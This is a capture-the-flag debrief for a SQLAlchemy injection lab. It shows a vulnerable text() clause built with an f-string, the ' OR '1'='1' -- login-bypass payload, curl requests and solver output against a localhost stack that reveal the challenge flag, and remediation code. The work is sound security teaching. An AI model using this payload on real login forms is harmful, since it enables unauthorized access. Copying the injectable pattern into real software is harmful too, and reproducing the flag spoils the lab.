# Manipulator's Firewall, Debrief

**Node:** `p5_1` &middot; **Flag:** `SEIYAKU{orm_is_not_armor}` &middot; **Route:** `POST /p5/firewall` &middot; **Sink:** `challenges/phase5.py`, real MariaDB via a real SQLAlchemy `Session` &middot; **Signal:** the chairman's own `secret` column, only ever revealed on a genuine match against `firewall_users`

## What an ORM normally buys you

SQLAlchemy's own query-building API is safe by construction:

```python
db.query(FirewallUser).filter(FirewallUser.username == username)
```

No matter what `username` contains, quotes, `OR`, comments, anything,
SQLAlchemy sends it to the database as a **bound parameter**, never as
text spliced into the SQL string. The database driver and the database
itself keep the value and the query structure in two completely
separate channels; there is no string for a `'` to "break out of"
because the value was never concatenated into one in the first place.
This is the same mechanism as a parameterized query in raw SQL
(`cursor.execute("... WHERE id = ?", (user_input,))`), an ORM's normal
API is just a friendlier way to reach the same safe mechanism.

Every ORM worth using also ships an escape hatch for the rare query its
safe API genuinely can't express: SQLAlchemy's is `text()`. `text()`
executes **exactly** the SQL string it's handed, it does not
parameterize anything baked into that string before `text()` ever sees
it. It has its own separate, correct way to bind parameters
(`text("username = :u").bindparams(u=username)`), but nothing forces a
developer to use it.

## The bug, in one line

`challenges/phase5.py`'s `p5_firewall()` reaches for that escape hatch
and builds its argument with a plain Python f-string:

```python
# challenges/phase5.py, p5_1
clause = text(
    f"username = '{username}' AND password = '{password}'"
)
matched = db.query(FirewallUser).filter(clause).first()
```

This is `text()` executing whatever string arrives, and that string
was assembled by hand, with `username`/`password` interpolated in
*before* `text()` ever runs. It is not meaningfully different from the
exact same bug with zero ORM involved:

```python
cursor.execute(
    f"SELECT * FROM firewall_users WHERE username = '{username}' "
    f"AND password = '{password}'"
)
```

The ORM sits in front of the database; it never sits in front of a raw
string that was already fully built before the ORM's own layer ever
touched it. "ORM" is not a security boundary, parameterization is, and
this code path never uses it.

## Why a genuine login stays clean

The seeded `sandbox` staff account has an empty `secret` column, so
proving the *ordinary* login path is not itself the bug is a single
clean request:

```bash
curl -s -X POST "$BASE/p5/firewall" -H "Accept: application/json" \
    --data-urlencode "username=sandbox" --data-urlencode "password=sandbox-pw"
```

```json
{"error":null,"success":true,"user":{"role":"staff","secret":null,"username":"sandbox"},"username":"sandbox"}
```

`success:true`, `secret:null`, a correctly-credentialed login for a
non-chairman account works exactly as intended and leaks nothing. And
guessing at the chairman's real password fails cleanly, same as any
ordinary auth check would:

```bash
curl -s -X POST "$BASE/p5/firewall" -H "Accept: application/json" \
    --data-urlencode "username=netero" --data-urlencode "password=totally-wrong-guess"
```

```json
{"error":null,"success":false,"user":null,"username":"netero"}
```

Both of those are the route behaving completely normally. The bug is
not "the login is too permissive", it's "the string this route builds
to check a login is not the string it thinks it's building" the moment
`username` or `password` contains a quote.

## The payload, `' OR '1'='1' -- `

This is the exact fundamentals payload from Phase 1's Gate of Trust,
unmodified, the whole point of this floor is that it still works,
completely unchanged, one abstraction layer further back. Submit:

```
username = ' OR '1'='1' --
password  = anything
```

The f-string builds:

```
username = '' OR '1'='1' -- ' AND password = 'anything'
```

MariaDB reads `-- ` (dash-dash-space) as the start of a line comment,
so everything from there onward, including the real `AND password =
'...'` clause, is discarded before the query ever runs. What
`text()` actually executes is:

```sql
username = '' OR '1'='1'
```

`'1'='1'` is a string literal comparison that is always true, `OR`'d
against a `username = ''` check that's almost always false, the net
effect is a `WHERE` clause that matches **every row** in
`firewall_users`, regardless of what either field contained. SQLAlchemy's
`.first()` then returns the first row `ORDER BY` would naturally give
back with no explicit ordering specified, the lowest `id`, which is
exactly row `id=1`: the chairman, `netero`.

Live proof against the real running stack:

```bash
curl -s -X POST "$BASE/p5/firewall" -H "Accept: application/json" \
    --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=anything"
```

```json
{"error":null,"success":true,"user":{"role":"chairman","secret":"SEIYAKU{orm_is_not_armor}","username":"netero"},"username":"' OR '1'='1' -- "}
```

`success:true`, logged in as `netero` (`role:"chairman"`), with the
flag sitting right in `secret`, recovered with no real username and no
real password supplied anywhere in the request.

## The full solver, live

`solvers/p5_1.sh` runs all three checks below against the real running
stack, in order: (1) a genuine correctly-credentialed login must
succeed and leak nothing, (2) a wrong-password guess against the real
chairman account must fail, (3) the ORM-injection bypass. This is the
actual, unedited output of a real run against this exact seed
(`SEIYAKU_BASE` was the default `http://localhost:8000` for this run):

```
[p5_1] target: http://localhost:8000/p5/firewall
[p5_1] step 1, legitimate login: username=sandbox&password=sandbox-pw
  response: {"error":null,"success":true,"user":{"role":"staff","secret":null,"username":"sandbox"},"username":"sandbox"}
  ok: legitimate sandbox login succeeded
[p5_1] step 2, wrong-password guess: username=netero&password=totally-wrong-guess
  response: {"error":null,"success":false,"user":null,"username":"netero"}
  ok: wrong chairman password correctly rejected
[p5_1] step 3, auth bypass: username=' OR '1'='1' -- , password=anything
  response: {"error":null,"success":true,"user":{"role":"chairman","secret":"SEIYAKU{orm_is_not_armor}","username":"netero"},"username":"' OR '1'='1' -- "}
  ok: ORM-injection auth bypass logged in as the chairman, flag recovered: SEIYAKU{orm_is_not_armor}
[p5_1] ok: legitimate login clean, wrong password rejected, ORM-injection
[p5_1]     bypass recovered the chairman's flag against real MariaDB
[p5_1] PASS
```

## HxH analogy

Conjuration is the Nen category for materializing something that looks
and behaves exactly like the real object it's modeled on, a
Conjurer's sword cuts, their house has working plumbing, their car
drives. What makes a Conjured object dangerous to rely on isn't that it
*looks* fake; it's that its soundness only ever goes as deep as the
rules its creator actually enforced when they built it, and nowhere
further. The Palace's inner gate looks, from the outside, exactly like
a properly engineered checkpoint, because for every path except one,
it is. The one escape hatch nobody re-checked is the one seam where the
Conjured object stops behaving like the real thing it resembles, and
underneath, it's the same raw material every earlier floor was already
built from.

## Remediation

- **Never build a raw-SQL string by hand and hand it to an ORM's raw
  escape hatch.** Fix, using SQLAlchemy's own bound-parameter syntax
  for `text()`:

  ```python
  from sqlalchemy import text

  clause = text("username = :u AND password = :p")
  matched = (
      db.query(FirewallUser)
      .filter(clause)
      .params(u=username, p=password)
      .first()
  )
  ```

  or, better still, avoid `text()` entirely here, this exact query has
  no reason not to use the ORM's own safe comparison API:

  ```python
  matched = (
      db.query(FirewallUser)
      .filter(FirewallUser.username == username, FirewallUser.password == password)
      .first()
  )
  ```

- **Treat every raw-SQL escape hatch (`text()`, `.from_statement()`,
  `.extra()`, `db.session.execute()` with a hand-built string) as a
  SQL-injection sink and review it exactly like a raw `cursor.execute()`
  call**, "it's behind an ORM" is not a mitigating factor if the
  string reaching that call was ever built by concatenation or an
  f-string.
- **Never store or compare plaintext passwords.** This lab does, for
  clarity, a real system hashes with a slow, salted KDF (bcrypt,
  scrypt, Argon2) and compares hashes, which also happens to make a
  `' OR '1'='1'`-style bypass far less immediately catastrophic even if
  the injection itself isn't yet fixed, since no `password = '...'`
  clause is ever comparing to a human-readable secret in the first
  place.
- **Least-privilege database account.** The application's own DB user
  should only have the grants its features actually need, read/write
  on the specific tables/columns it touches, never blanket access,
  so an injection bug's blast radius stops well short of "the entire
  database."
